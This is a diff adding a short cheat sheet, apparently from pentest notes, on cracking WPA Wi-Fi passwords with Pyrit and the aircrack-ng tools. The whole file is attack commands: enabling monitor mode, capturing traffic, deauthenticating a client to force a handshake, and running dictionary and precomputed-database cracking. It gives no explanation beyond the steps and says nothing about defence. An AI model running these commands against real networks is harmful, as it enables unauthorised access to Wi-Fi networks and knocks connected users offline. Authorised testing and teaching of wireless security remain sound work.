@@ -1,0 +1,36 @@
+PYRIT ATTACK
+Pyrit Attack
+---------------
+
+Place your wireless card into monitor mode on the channel number of the AP:
+
+airmon-ng start <interface> <AP channel>
+
+Use Pyrit to sniff on the monitor mode interface, saving the capture to a file:
+
+pyrit -r <interface> -o <capture> stripLive
+
+Deauthenticate a connected client to force it to complete the 4-way handshake:
+
+aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+
+Run Pyrit in dictionary mode to crack the WPA password:
+
+pyrit -r <capture> -i <wordlist> -b <AP MAC> attack_passthrough
+
+To use Pyrit in database mode, begin by importing your wordlist:
+
+pyrit -i <wordlist> import_passwords
+
+Add the ESSID of the access point to the Pyrit database:
+
+pyrit -e <ESSID> create_essid
+
+Generate the PMKs for the ESSID:
+
+pyrit batch
+
+Launch Pyrit in database mode to crack the WPA password:
+
+pyrit -r <capture> -b <AP MAC> attack_db
+
